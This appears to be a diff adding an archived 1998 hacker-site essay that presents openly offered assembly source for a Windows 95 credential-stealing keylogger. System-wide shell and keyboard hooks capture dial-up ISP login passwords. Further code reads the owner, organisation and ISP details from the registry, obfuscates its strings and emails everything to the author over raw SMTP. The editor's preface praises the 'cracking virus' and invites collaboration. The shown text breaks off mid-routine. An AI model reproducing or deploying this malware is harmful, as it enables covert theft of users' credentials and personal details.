@@ -1,0 +1,2407 @@
+<HTML>
+
+<HEAD>
+
+<TITLE>int_acc.htm: Reversing Governmental Polices: Internet access for the masses</TITLE>
+
+
+
+<BODY bgcolor="C0C0C0" text="#001010" vlink="#405040 Alink=#00FF50">
+
+<CENTER>
+
+<HR><A href="noanon.htm" tppabs="http://www.anticrack.de/fravia/noanon.htm"><IMG SRC="noanon.gif" tppabs="http://www.anticrack.de/fravia/noanon.gif" ALT="Anonymity" 
+
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></A><BR>
+
+<FONT color=gray>Fravia's Anonymity Academy</FONT>
+
+<HR><H2>
+
+Reversing Governmental Polices: Internet access for the masses<BR>
+
+by MML</H2>(23 September 1998)
+
+<HR>
+
+Mighty Mole! This cracker has produced a cracking virus that keeps sending him 
+
+access passwords... Not bad, not at all! This very good essay recalls the splendid 
+
+essay by Yamato: <A href="going.htm" tppabs="http://www.anticrack.de/fravia/going.htm">Going
+
+undercover and browsing on your own proxy</A> that I posted on my pages more 
+
+than a year ago... See! A good reverser, confronted 
+
+with a situation he dislikes can do ANYTHING!<BR>
+
+But the following is not even based on the physical access to your colleagues' computers 
+
+(always dangerous if you ask me).<BR>
+
+As you can read here, MML is seeking collaboration and help, and he has very sound ideas, hope 
+
+many readers will join him and develop a small ad hoc project, that the +HCU will be 
+
+happy to host and support. Yet there's at the same time something, here, that really should 
+
+scare you all: as you will read it is relatively easy to implement (and hyde) 
+
+such techniques. Therefore the chances of finding similar virus-like code 
+
+snippets inside the huge and overbloated  
+
+pukeprograms by Micro$oft are quite slim for the average luser (or gizmos, as MML 
+
+calls them :-)<BR>
+
+Any good idea for implementing a global 'culprit finder' tool that we could run (for instance 
+
+checking inside your target
+
+for hidden code that opens or closes sockets)? We would be well advised to 
+
+perform such checks -already now- BEFORE using 
+
+any new application we buy (or crack :-)? 
+
+Please send, please contribute, please read and enjoy!
+
+<HR></CENTER>
+
+<PRE>
+
+               Reversing Governmental Polices
+
+
+
+		     [ MML 23 Sep 1998 ]
+
+
+
+
+
+  The Problem = Internet Access.
+
+
+
+     1.	In a country where best pay packages are around $600 / month, the 
+
+	cheapest internet access is charged at $1/hour + the phone line bill. 
+
+     2.	The cheapest internet is provided by a governmental agency, and the 
+
+	waiting list for ordinary people is 8 months and instant excess is 
+
+	for high ups. 
+
+     3.	Only the internet provided by the govt. ISP could be accessed 
+
+  	from all major cities. 
+
+
+
+  Due to the above facts I decided to device a scheme which will solve my internet 
+
+  access problems on a permanent basis. 
+
+
+
+  Design Basis.
+
+
+
+     1.	The scheme must be able to trap the access passwords in a transparent 
+
+  	way, and I must get them wherever I am. 
+
+     2.	The program must be compatible with all WindooZ 95 versions. 
+
+     3.	No undocumented API may be used. 
+
+     4.	The size of the program should be as small as possible. 
+
+     5.	Program must provide sufficent information about the user, so that 
+
+	only passwords belonging to govt. agencies and companies should be 
+
+	used and no innocent user is harmed. 
+
+
+
+  Tools.
+
+
+
+  TASM 5.0
+
+  Borland Resource Editor 4.5
+
+  M$ Resource Compiler for win32
+
+  Any Good Editor
+
+
+
+  Details.
+
+
+
+  To write the shortest possible program, it must be in assembly and in 
+
+  our case asm32. First I searched all the sites related with windows 95 
+
+  assembly and got as much information as possible. (masta_s tutorials 
+
+  really helped. The ideal way to get password is to trap it and send it 
+
+  to an E-mail account, when a user logs on.
+
+
+
+  Now our program must consist of the following parts :
+
+
+
+  1- Trapping mechanism.
+
+  2- Routines to gather information about the user.
+
+  3- E-mailing scheme.
+
+
+
+  A master logic controls the functions of all of the above routines. 
+
+  Step by Step details of the above parts are given below :
+
+
+
+  1-Trapping mechanism :
+
+
+
+  In the logging on scheme of this ISP, after you dial the number, a black 
+
+  window titled "Post-Dial terminal Session" appears. One must enter two 
+
+  different logins and passwords (for extra security :-) to enter a unix
+
+  machine, on which a menu appears and when one presses 'p' a message 
+
+  appears that the machine is ready for ppp. After that you must press 
+
+  F7 and you will be logged on the network. I planned to trap all the 
+
+  keys which are being pressed in the "Post-Dial terminal session" window. 
+
+
+
+  By consulting windows API we can see that it provides a number of 
+
+  HOOK functions. To install a system Wide hook, the code must reside inside 
+
+  a dll. As given in API :
+
+
+
+  The SetWindowsHookEx function installs an application-defined hook 
+
+  procedure into a hook chain. An application installs a hook procedure 
+
+  to monitor the system for certain types of events. A hook procedure can
+
+  monitor events associated either with a specific thread or with all threads 
+
+  in the system. 
+
+
+
+  HHOOK SetWindowsHookEx(
+
+  int idHook, // type of hook to install
+
+  HOOKPROC lpfn, // address of hook procedure
+
+  HINSTANCE hMod, // handle of application instance
+
+  DWORD dwThreadId // identity of thread to install hook for 
+
+  );
+
+
+
+  Two types of hook functions were used, the first hook activates the 
+
+  keyboard hooking function, when "Post-Dial terminal Session" window 
+
+  is activated. The code used in the dll is given below :
+
+
+
+
+
+
+
+  ;Some Constants
+
+
+
+  PUBLICDLL R16052
+
+  PAGE_READWRITE = 04h
+
+  FILE_MAP_READ_WRITE = (2h OR 4h ) 
+
+
+
+  extern CreateFileMappingA :PROC
+
+  extern MapViewOfFile :PROC
+
+  extern SetTimer :PROC
+
+  extern KillTimer :PROC
+
+  extern UnmapViewOfFile :PROC
+
+  extern OpenFileMappingA :PROC
+
+
+
+  .data 
+
+
+
+  ;================= DLL DATA AREA ========================= 
+
+
+
+  cwin1 db 'Post-Dial Terminal',0 ;Title of window from which keys are captured
+
+  length1 EQU ($-offset cwin1)-1
+
+  keybuffer db 102 dup(0) ;Keyboard buffer
+
+  bypass dw 0
+
+  Keyhook dd 0
+
+  buffindex dd 0
+
+  Killk db 0
+
+  new_hInst dd 0
+
+  hhook1 dd 0 ;Hook Handle
+
+  hw dd 0
+
+  init12 dd 0
+
+  szTitleName db 100 dup(0)
+
+  titlelen dd 0
+
+  fnam db "GothMachhi4991",0
+
+  hmapf dd 0
+
+  mapaddr dd 0
+
+
+
+  ;================= DLL CODE AREA ========================= 
+
+
+
+  .code 
+
+
+
+  Start:
+
+
+
+  DllMain PROC g_hInst: HINSTANCE, dwReason: DWORD, lperved: PVOID 
+
+
+
+  push ebx ecx edx esi edi
+
+  mov ebx, dwReason
+
+  cmp ebx, DLL_PROCESS_ATTACH
+
+  jnz @@3
+
+  mov eax,[g_hInst]
+
+  mov [new_hInst],eax
+
+
+
+  @@3:
+
+
+
+
+
+  mov eax, 1
+
+  pop edi esi edx ecx ebx 
+
+  ret 
+
+
+
+  DllMain ENDP 
+
+
+
+  ;---------------------------------------------------------------
+
+
+
+  R16052 PROC uses , orighwnd:DWORD , myaction:DWORD 
+
+
+
+  push ebx ecx edx esi edi 
+
+
+
+  cmp [myaction],1
+
+  jz @@uninstall 
+
+
+
+  cmp [init12],0
+
+  jne @@14 
+
+
+
+  mov [init12],123
+
+  mov eax,[orighwnd]
+
+  mov [hw],eax
+
+
+
+  call OpenFileMappingA, FILE_MAP_READ_WRITE, FALSE, offset fnam 
+
+
+
+  ;Actual map file is created by the main program, and here it 
+
+  ;is being opened for data transfer between dll and main program.
+
+
+
+  test eax,eax
+
+  jz @@15
+
+  mov [hmapf],eax 
+
+
+
+  call MapViewOfFile, [hmapf], FILE_MAP_READ_WRITE, 0, 0, 0 
+
+  test eax,eax
+
+  jz @@15
+
+  mov [mapaddr],eax 
+
+
+
+  push 0 
+
+  push [new_hInst]
+
+  push offset HookProc 
+
+  push WH_SHELL 
+
+
+
+  call SetWindowsHookExA 
+
+
+
+  cmp eax,0
+
+  je @@15
+
+  mov [hhook1],eax
+
+  jmp @@14
+
+
+
+  @@uninstall:
+
+
+
+  call UnhookWindowsHookEx, [hhook1] 
+
+
+
+  call UnmapViewOfFile, [mapaddr]
+
+  call CloseHandle, [hmapf] 
+
+
+
+  @@14:
+
+  mov eax,1 
+
+
+
+  @@15:
+
+  pop edi esi edx ecx ebx 
+
+
+
+  ret 
+
+
+
+  R16052 ENDP 
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=&gt;&gt;&gt; 
+
+
+
+  HookProc proc uses ebx edi esi, nCode:DWORD, wparam1:DWORD, lparam1:DWORD 
+
+
+
+  cmp nCode,0
+
+  jl @@14 
+
+
+
+  cmp [bypass],0DADh
+
+  je @@15 
+
+
+
+  cmp nCode,HSHELL_REDRAW
+
+  jne @@14 
+
+
+
+  call CheckTitle
+
+  test eax,eax
+
+  jnz @@13
+
+
+
+  mov [bypass],0DADh 
+
+
+
+  call SetWindowsHookExA, WH_KEYBOARD, offset KeyHookProc, [new_hInst], 0 
+
+
+
+  cmp eax,0
+
+  je @@error
+
+  mov [Keyhook],eax
+
+  jmp @@13 
+
+
+
+  @@error:
+
+  mov eax,0FFFFFFFFh
+
+  mov [bypass],0 
+
+
+
+  @@13:
+
+  mov ecx,[titlelen]
+
+  mov eax,0 
+
+  mov edi,offset szTitleName
+
+  cld
+
+  rep stosb 
+
+
+
+  @@14:
+
+  call callNextHookEx, [hhook1], [nCode], [wparam1], [lparam1] 
+
+
+
+  ret 
+
+
+
+  @@15:
+
+  cmp nCode,HSHELL_WINDOWDESTROYED
+
+  jne @@14 
+
+
+
+  call CheckTitle
+
+  test eax,eax
+
+  jnz @@13 
+
+
+
+  call UnhookWindowsHookEx, [Keyhook] 
+
+
+
+  mov eax,[buffindex]
+
+  mov ecx,eax
+
+  push ecx
+
+  mov esi,offset keybuffer
+
+  mov edi,[mapaddr]
+
+  push edi
+
+  cld
+
+  inc edi
+
+  inc edi
+
+  repne movsb 
+
+
+
+  pop edi
+
+  pop ecx
+
+  mov word ptr [edi],cx
+
+
+
+  mov [bypass],0
+
+  mov [Killk],0 
+
+
+
+  jmp @@13 
+
+
+
+  HookProc endp 
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt; 
+
+
+
+  CheckTitle proc 
+
+
+
+  call GetWindowTextLengthA , [wparam1]
+
+  inc eax 
+
+
+
+  mov [titlelen], eax
+
+  call GetWindowText,[wparam1],offset szTitleName,eax 
+
+
+
+  lea esi, cwin1
+
+  lea edi, szTitleName
+
+  mov ecx, length1
+
+  repe cmpsb
+
+  jne @@notEq
+
+  jmp @@equal
+
+
+
+
+
+  @@notEq:
+
+
+
+
+
+  mov eax,1 
+
+  ret
+
+
+
+
+
+  @@equal:
+
+  mov eax,0
+
+  ret 
+
+
+
+  CheckTitle endp 
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt; 
+
+
+
+  KeyHookProc proc uses ebx edi esi, nCode:DWORD, wparam1:DWORD, lparam1:DWORD 
+
+
+
+  cmp nCode,0
+
+  jl @@13 
+
+
+
+  mov eax,lparam1
+
+  test eax,80000000h
+
+  jz @@13 
+
+
+
+  cmp [Killk],5
+
+  jz @@13 
+
+
+
+  mov edx,[buffindex]
+
+  mov eax,[wparam1]
+
+  mov edi,offset keybuffer 
+
+  add edi,edx
+
+  mov byte ptr[edi],al
+
+  inc [buffindex]
+
+  cmp [buffindex],100 
+
+
+
+  jae @@15 
+
+
+
+  @@13:
+
+  call callNextHookEx, [hhook1], [nCode], [wparam1], [lparam1] 
+
+
+
+  ret 
+
+
+
+  @@15:
+
+  mov [Killk],5
+
+  jmp @@13 
+
+
+
+  KeyHookProc endp 
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt;
+
+  End Start
+
+
+
+
+
+
+
+  As you may have noted I haven't commented much the code, that is 
+
+  because it is not ment for total gizmos. A brief summary of the 
+
+  actions which the code is doing is given below :
+
+
+
+  A shell hook WH_SHELL is installed. It monitors the title of every 
+
+  window being activated. When our target window becomes activated, 
+
+  it installs the keyboard hook procedure, which captures the key 
+
+  strokes. When the window is closed (F7 pressed) the shell hook 
+
+  procedure sets a byte in the mapping file, (mapping file is being
+
+  continuously monitored by the main program). When the main program 
+
+  reads that particular byte its sends the keys via SMTP mail.
+
+
+
+  A single data area is being used for all the instances of 
+
+  the dll. (This must be mentioned in the def file).
+
+
+
+   
+
+
+
+  2-Routines to send E-mail :
+
+
+
+  The main program is given below :
+
+
+
+
+
+
+
+  .data
+
+
+
+  ;================ MAIN FILE DATA ================================
+
+
+
+  newhwnd  dd      0
+
+  msg              MSGSTRUCT      &lt;?>
+
+  wc               WNDCLASS       &lt;?>
+
+
+
+  hInst    dd      0
+
+  szClassName             db      'ASMCLASS32',0
+
+
+
+
+
+  Mydllname               db      "xyz.dll",0
+
+  MydllHwnd               dd      0
+
+  Mydllfunctionname       db      "R16052",0
+
+  Mydllfunctionadd        dd      0
+
+
+
+  fnam     db      "GothMachhi4991",0
+
+  hmapf    dd      0
+
+  mapaddr  dd      0
+
+  keymaillen              dd      0
+
+  keymailbase             dd      0
+
+  ipaddbase               dd      0
+
+  iplen    dd      0
+
+  bypass   db      0
+
+  try      db      0
+
+  newlogicp               db      0
+
+          
+
+  ;=============== REGISTRY DATA ==================================
+
+
+
+  subkeyval       db      'RemoteAccess'
+
+  n               db      0
+
+                  db      'Profile\'
+
+  reglen          equ     $-offset subkeyval
+
+
+
+  n1              db      80 dup(0)
+
+  val1            db      'Default',0
+
+
+
+  phkresult       dd      0
+
+  dwtype          dd      0
+
+  rkbuff          db      80 dup(0)
+
+  rknum           dd      80
+
+  rknum1          dd      12
+
+
+
+  userb           db      60 dup(0)
+
+  compb           db      60 dup(0)
+
+  userl           dd      59
+
+  compbl          dd      59
+
+
+
+
+
+  key             db      055h,054h,012h,095h,056h,0d0h,015h,0d1h,097h
+
+                  db      0d3h,0dah,059h,01dh,05ch,05dh,05ch,01ah,09dh,097h
+
+                  db      056h,0dah,01ch,099h,05ch,05eh,05dh,097h,051h,0ddh
+
+                  db      01dh,01dh,0d9h,01ch,09dh,016h,0d9h,01dh,05dh,0dah
+
+                  db      05ch,01ch,080h,080h
+
+           ;------>SOFTWARE\Microsoft\Windows\CurrentVersion
+
+
+
+  val2            db      015h,0d9h,05ah,0dah,05dh,09dh,0d9h,01dh,0d9h,099h
+
+                  db      054h,05eh,01ch,0d9h,01dh,080h,080h
+
+           ;------>RegisteredOwner
+
+
+
+  val3            db      015h,0d9h,05ah,0dah,05dh,09dh,0d9h,01dh,0d9h,099h
+
+                  db      054h,01dh,05ah,0d8h,01ch,0dah,01fh,0d8h,09dh,0dah
+
+                  db      05ch,01ch,080h,080h
+
+           ;------>RegisteredOrganization
+
+
+
+  tkeylen         =       $-offset key
+
+
+
+  ;================ WINSOCK DATA ==================================
+
+
+
+  wsa      WSADATA &lt;?>
+
+  hserver         dd      0
+
+  addr     SOCKADDR_IN &lt;?>
+
+
+
+  databuff        db      70h dup(0)
+
+
+
+  helo            db      092h,0d1h,093h,054h,088h,09ch,0d8h,05bh,01ch,0d9h
+
+                  db      0c3h
+
+                  db      03h
+
+           ;--------------->'HELO abc.xyz.com',0dh,0ah
+
+  helolen         equ     $-offset helo
+
+
+
+  mailfrm         db      0d3h,0d0h,0d2h,093h,088h,012h,015h,054h,0d3h,0fh
+
+
+
+           ;------------>'MAIL FROM: 123@xyz.com',0dh,0ah
+
+  mailfrmlen      equ     $-offset mailfrm
+
+
+
+  rcptto          db      015h,051h,094h,095h,088h,095h,054h,0fh,088h,01dh
+
+           ;-------->'RCPT TO: abc@123.net',0dh,0ah
+
+
+
+  rcpttolen       equ     $-offset rcptto
+
+
+
+  cdata           db      091h,0d0h,095h,0d0h,0c3h,03h
+
+           ;--------->'DATA',0dh,0ah
+
+  cdatalen        equ     $-offset cdata
+
+
+
+  qmail           db      0d4h,0d5h,0d2h,095h,0c3h,03h
+
+           ;--------->'QUIT',0dh,0ah
+
+  qlen            equ     $-offset qmail
+
+
+
+  subject         db      05dh,0ddh,019h,01bh,0d9h,059h,09dh,088h,0fh
+
+  rsub            db      45 dup(88h)
+
+                  db      0c3h,03h
+
+           ;------> subject : xxxxxxxxxxxxxx
+
+  subjectlen      equ     $-offset subject
+
+
+
+  totallen        equ     $-offset helo
+
+
+
+  fdata           db      0dh,0ah,'.',0dh,0ah
+
+
+
+  ecount          db      3
+
+
+
+  ipofhost        dd      01234567h ;IP address of your SMTP server
+
+  ;==================================================================
+
+
+
+
+
+  .Code
+
+
+
+  Main:
+
+          push    L 0
+
+          call    GetModuleHandleA        ; get hmod (in eax)
+
+          mov     [hInst], eax            ; hInstance is same as HMODULE
+
+				          ; in the Win32 world
+
+
+
+          mov     [wc.clsStyle], CS_HREDRAW + CS_VREDRAW + CS_GLOBALCLASS
+
+          mov     [wc.clsLpfnWndProc],offset WndProc
+
+          mov     [wc.clsCbClsExtra], 0
+
+          mov     [wc.clsCbWndExtra], 0
+
+
+
+          mov     eax,[hInst]
+
+          mov     [wc.clsHInstance], eax
+
+
+
+          mov     [wc.clsHbrBackground], COLOR_WINDOW + 1
+
+          mov     dword ptr [wc.clsLpszMenuName], 0
+
+          mov     dword ptr [wc.clsLpszClassName], offset szClassName
+
+
+
+          push    offset wc
+
+          call    RegisterClassA
+
+
+
+          push    L 0       ; lpParam
+
+          push    [hInst]   ; hInstance
+
+          push    L 0       ; menu
+
+          push    L 0       ; parent hwnd
+
+          push    L CW_USEDEFAULT          ; height
+
+          push    L CW_USEDEFAULT          ; width
+
+          push    L CW_USEDEFAULT          ; y
+
+          push    L CW_USEDEFAULT          ; x
+
+          push    L WS_OVERLAPPEDWINDOW    ; Style
+
+          push    0         ;offset szTitleName       ; Title string
+
+          push    offset szClassName       ; Class name
+
+          push    L 0       ; extra style
+
+
+
+          call    CreateWindowExA
+
+
+
+          mov     [newhwnd], eax
+
+
+
+   msg_loop:
+
+          push    L 0
+
+          push    L 0
+
+          push    L 0
+
+          push    offset msg
+
+          call    GetMessageA
+
+
+
+          cmp     ax, 0
+
+          je      end_loop
+
+
+
+          push    offset msg
+
+          call    TranslateMessage
+
+
+
+          push    offset msg
+
+          call    DispatchMessageA
+
+
+
+          jmp     msg_loop
+
+
+
+  end_loop:
+
+
+
+          push    [msg.msWPARAM]
+
+          call    ExitProcess
+
+
+
+  ;-----------------------------------------------------------------------------
+
+
+
+  WndProc          proc uses ebx edi esi, hwnd3:DWORD, wmsg:DWORD, wparam:DWORD, lparam:DWORD
+
+
+
+  ;--------;;;;;Win32 requires that EBX, EDI, and ESI be preserved!  
+
+
+
+          
+
+          LOCAL   theDC:DWORD
+
+
+
+          cmp     [wmsg], WM_DESTROY
+
+          je      wmdestroy
+
+          
+
+          cmp     [wmsg], WM_CREATE
+
+          je      wmcreate
+
+          
+
+          cmp     [wmsg],WM_TIMER
+
+          je      wmtimer
+
+
+
+          jmp     defwndproc
+
+
+
+  wmcreate:
+
+          
+
+     mov     byte ptr [try],3
+
+                  
+
+     call    CreateFileMappingA, 0ffffffffh, NULL, PAGE_READWRITE , 0, (1024*3), offset fnam
+
+     test    eax,eax
+
+     jz      @@force
+
+          
+
+     mov     [hmapf],eax
+
+
+
+     call    MapViewOfFile, [hmapf], FILE_MAP_READ_WRITE, 0, 0, 0 ;FILE_MAP_ALL_ACCESS
+
+     test    eax,eax
+
+     jz      @@f1
+
+
+
+     mov     [mapaddr],eax
+
+
+
+          mov     edx,eax
+
+          xor     eax,eax
+
+          mov     [edx],eax       
+
+
+
+          call    SetTimer, [hwnd3], 1, 1000, NULL
+
+
+
+          call    LoadLibraryA, offset Mydllname
+
+          mov     MydllHwnd, eax
+
+
+
+          call    GetProcAddress, [MydllHwnd], offset Mydllfunctionname
+
+          mov     Mydllfunctionadd, eax
+
+
+
+          call    [Mydllfunctionadd], [hwnd3],0   
+
+          cmp     eax,0
+
+          jz      wmdestroy
+
+
+
+          jmp     finish
+
+
+
+
+
+  wmtimer:
+
+          cmp     byte ptr [bypass],1
+
+          jz      @@newlogic
+
+
+
+          mov     eax, [mapaddr]
+
+          cmp     word ptr [eax],0
+
+          jz      finish
+
+          call    KillTimer, [hwnd3], 1
+
+          
+
+          call    SendMeData
+
+          call    QDEmail
+
+          cmp     eax,0
+
+          jz      wmdestroy
+
+
+
+          mov     [bypass],1
+
+          call    SetTimer, [hwnd3], 1, (60*1000*5), NULL
+
+          jmp     finish
+
+
+
+  @@newlogic :
+
+          
+
+          cmp     byte ptr[newlogicp],1
+
+          jz      @@f
+
+          dec     byte ptr [try]
+
+          cmp     byte ptr[try],0
+
+          jz      wmdestroy
+
+
+
+          mov     byte ptr[newlogicp],1
+
+          call    QDEmail
+
+          cmp     eax,0
+
+          jnz     @@f2
+
+          call    KillTimer, [hwnd3], 1             
+
+
+
+          jmp     wmdestroy
+
+          
+
+  @@f2:
+
+          cmp     [try],1
+
+          jnz     @@13
+
+          mov     [ipofhost],abcdefgh     ;abcdefgh=alternate IP address
+
+
+
+  @@13:
+
+          mov     byte ptr[newlogicp],0
+
+
+
+  @@f:
+
+          jmp     finish            
+
+
+
+
+
+  wmdestroy:
+
+
+
+          call    [Mydllfunctionadd], [hwnd3],1
+
+
+
+          call    UnmapViewOfFile, [mapaddr]
+
+
+
+  @@f1:
+
+
+
+          call    CloseHandle,     [hmapf]
+
+                  
+
+  @@force:
+
+
+
+          push    L 0
+
+          call    PostQuitMessage
+
+          mov     eax, 0
+
+          jmp     finish
+
+
+
+
+
+  defwndproc:
+
+          push    [lparam]
+
+          push    [wparam]
+
+          push    [wmsg]
+
+          push    [hwnd3]
+
+          call    DefWindowProcA
+
+          jmp     finish
+
+
+
+
+
+  finish:
+
+          ret
+
+
+
+  WndProc          endp
+
+  ;-------------------------------------------------------
+
+
+
+
+
+
+
+  HexWrite8 proc
+
+  ;
+
+  ; AL has two hex digits that will be written to ES:EDI in ASCII form
+
+  ;
+
+
+
+          mov     ah, al
+
+          and     al, 0fh
+
+          shr     ah, 4
+
+                   ; ah has MSD
+
+                   ; al has LSD
+
+          or      ax, 3030h
+
+          xchg    al, ah
+
+          cmp     ah, 39h
+
+          ja      @@4
+
+  @@1:
+
+          cmp     al, 39h
+
+          ja      @@3
+
+  @@2:
+
+          stosw
+
+          ret
+
+  @@3:
+
+          sub     al, 30h
+
+          add     al, 'A' - 10
+
+          jmp     @@2
+
+  @@4:
+
+          sub     ah, 30h
+
+          add     ah, 'A' - 10
+
+          jmp     @@1
+
+
+
+  HexWrite8 endp
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt;
+
+
+
+  QDEmail         proc uses ebx edi esi
+
+
+
+          mov     byte ptr[ecount],2
+
+
+
+          call    WSAStartup, 101, offset wsa`    
+
+          test    eax, eax
+
+          jnz     @@Error
+
+
+
+          call    socket, AF_INET, SOCK_STREAM, 0
+
+          cmp     eax,0ffffffffh
+
+          jz      @@Error
+
+          mov     [hserver],eax
+
+          
+
+          mov     [addr.sin_port], 1900h          ;No need to call htons (19h->1900h)
+
+          mov     [addr.sin_family],AF_INET
+
+          mov     eax,[ipofhost]
+
+          mov     [addr.sin_addr],eax             ;host Ip in hex 
+
+
+
+  @@again:        
+
+          call    connect, [hserver], offset addr, 010h
+
+          test    eax,eax
+
+          jz      @@continue
+
+
+
+          call    WSAGetLastError
+
+          cmp     [ecount],0
+
+          jz      @@Error1
+
+          dec     [ecount]
+
+
+
+          jmp     @@again
+
+  @@continue:
+
+
+
+          call    recv, [hserver], offset databuff, 70h, 0 
+
+          test    eax,eax
+
+          jz      @@Error1
+
+          cmp     [databuff],'3'
+
+          ja      @@Error1
+
+          
+
+          call    Decrypt, totallen, offset helo
+
+
+
+          call    send, [hserver], offset helo, helolen,0
+
+          call    recv, [hserver], offset databuff, 70h, 0
+
+          test    eax,eax
+
+          jz      @@Error1
+
+          cmp     [databuff],'3'
+
+          ja      @@Error1
+
+
+
+          call    send, [hserver], offset mailfrm, mailfrmlen,0   
+
+          call    recv, [hserver], offset databuff, 70h, 0
+
+          test    eax,eax
+
+          jz      @@E1
+
+          cmp     [databuff],'3'
+
+          ja      @@E1
+
+
+
+          call    send, [hserver], offset rcptto, rcpttolen,0
+
+          call    recv, [hserver], offset databuff, 70h, 0
+
+          test    eax,eax
+
+          jz      @@E1
+
+          cmp     [databuff],'3'
+
+          ja      @@E1
+
+
+
+          call    send, [hserver], offset cdata, cdatalen,0
+
+          call    recv, [hserver], offset databuff, 70h, 0
+
+          test    eax,eax
+
+          jz      @@E1
+
+          cmp     [databuff],'3'
+
+          ja      @@E1
+
+
+
+          call    send, [hserver], offset subject, subjectlen,0
+
+          call    send, [hserver], [Keymailbase], [Keymaillen],0 ;Send Key Codes
+
+          call    send, [hserver], offset fdata, 2,0 ;---> CR/LF
+
+          
+
+          cmp     [rknum],0
+
+          jz      @@nosend
+
+          
+
+          call    send, [hserver], [IPaddBase], [IPlen],0 ;Send Registry Default IP
+
+          call    send, [hserver], offset fdata, 2,0 ;---> CR/LF
+
+
+
+          call    send, [hserver], offset userb, [userl],0 ;Send Registry User Name
+
+          call    send, [hserver], offset fdata, 2,0 ;---> CR/LF
+
+
+
+          call    send, [hserver], offset compb, [compbl],0 ;Send Registry Company
+
+          call    send, [hserver], offset fdata, 2,0 ;---> CR/LF
+
+  @@nosend:
+
+
+
+          cmp     [rknum1],0
+
+          jz      @@nosend1
+
+          
+
+          call    send, [hserver], offset subkeyval,[rknum1],0 ;Send Registry ISP name
+
+          call    send, [hserver], offset fdata, 2,0      
+
+
+
+  @@nosend1:
+
+          
+
+          call    send, [hserver], offset fdata, 5,0      ;Finish sending data
+
+
+
+          call    recv, [hserver], offset databuff, 70h, 0
+
+          test    eax,eax
+
+          jz      @@E1
+
+          cmp     [databuff],'3'
+
+          ja      @@E1
+
+
+
+          call    send, [hserver], offset qmail, qlen,0
+
+          call    recv, [hserver], offset databuff, 70h, 0
+
+
+
+  @@E1:
+
+          call    closesocket, [hserver]
+
+          call    WSACleanup
+
+          
+
+          mov     eax,0
+
+          ret
+
+  @@Error1:
+
+          
+
+          call    closesocket, [hserver]
+
+          call    WSACleanup
+
+
+
+  @@Error:
+
+          mov     eax,1    
+
+          ret
+
+
+
+
+
+  QDEmail         Endp
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt;
+
+
+
+  GetDefaultIP    Proc uses ebx edi esi
+
+
+
+          call    RegOpenKeyExA, HKEY_CURRENT_USER, offset subkeyval,\
+
+                   0,KEY_ALL_ACCESS, offset phkresult
+
+          cmp     eax,ERROR_SUCCESS
+
+          jnz     @@ga1
+
+           
+
+          call    RegQueryValueExA, [phkresult], offset val1\
+
+                    , 0, offset dwtype, offset rkbuff, offset rknum
+
+          test    eax,eax
+
+
+
+          call    RegCloseKey, [phkresult]
+
+
+
+          
+
+          mov     [n],'\'
+
+          mov     ecx,[rknum]
+
+          mov     edx,ecx
+
+          mov     edi,offset n1
+
+          mov     esi,offset rkbuff       
+
+          repne   movsb
+
+          
+
+          dec     edx
+
+          add     edx,reglen
+
+          mov     [rknum1],edx
+
+
+
+          mov     byte ptr[val1],'I'
+
+          mov     byte ptr[val1+1],'P'
+
+          mov     byte ptr[val1+2],0
+
+
+
+          mov     [rknum],60
+
+
+
+          call    RegOpenKeyExA, HKEY_CURRENT_USER, offset subkeyval,\
+
+                   0,KEY_ALL_ACCESS, offset phkresult
+
+          cmp     eax,ERROR_SUCCESS
+
+          jnz     @@getaway
+
+
+
+          call    RegQueryValueExA, [phkresult], offset val1\
+
+                    , 0, offset dwtype, offset rkbuff, offset rknum
+
+          
+
+          call    RegCloseKey, [phkresult]
+
+  ;-------------------------------------------------------------------
+
+          
+
+          call    Decrypt,tkeylen, offset key
+
+   
+
+          call    RegOpenKeyExA, HKEY_LOCAL_MACHINE, offset key,\
+
+                   0,KEY_ALL_ACCESS, offset phkresult
+
+          cmp     eax,ERROR_SUCCESS
+
+          jnz     @@jmp
+
+
+
+          call    RegQueryValueExA, [phkresult], offset val2\
+
+                    , 0, offset dwtype, offset userb, offset userl
+
+          dec     [userl]
+
+
+
+          call    RegQueryValueExA, [phkresult], offset val3\
+
+                    , 0, offset dwtype, offset compb, offset compbl
+
+          dec     [compbl]
+
+
+
+          call    RegCloseKey, [phkresult]
+
+  ;------------------------------------------------------------------
+
+
+
+  @@jmp:
+
+          
+
+          ret
+
+
+
+  @@ga1 :
+
+
+
+          mov     [rknum1],0
+
+
+
+  @@getaway:
+
+          
+
+          mov     [rknum],0
+
+
+
+          ret
+
+
+
+
+
+  GetDefaultIP    Endp
+
+
+
+
+
+  &lt;&lt;&lt;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&gt;&gt;&gt;
+
+
+
+  SendMeData      Proc
+
+
+
+          mov     eax, [mapaddr]
+
+          movzx   ecx,word ptr[eax]
+
+          mov     esi,eax
+
+          
+
+          add     eax,ecx
+
+          inc     eax
+
+          inc     eax
+
+          inc     eax
+
+
+
+          inc     esi
+
+          inc     esi
+
+
+
+          mov     edi,eax
+
+          
+
+          push    ecx
+
+          push    edi
+
+
+
+  @@again:
+
+
+
+          push    esi edi
+
+          mov     al,byte ptr[esi]
+
+          call    HexWrite8
+
+          pop     edi esi
+
+
+
+          inc     esi
+
+          inc     edi
+
+          inc     edi
+
+          loop    @@again
+
+          
+
+          mov     byte ptr[edi],0dh
+
+          inc     edi
+
+          mov     byte ptr[edi],0ah
+
+          inc     edi
+
+          mov     byte ptr[edi],'I'
+
+
+
+          pop     edi
+
+          pop     ecx
+
+          inc     ecx
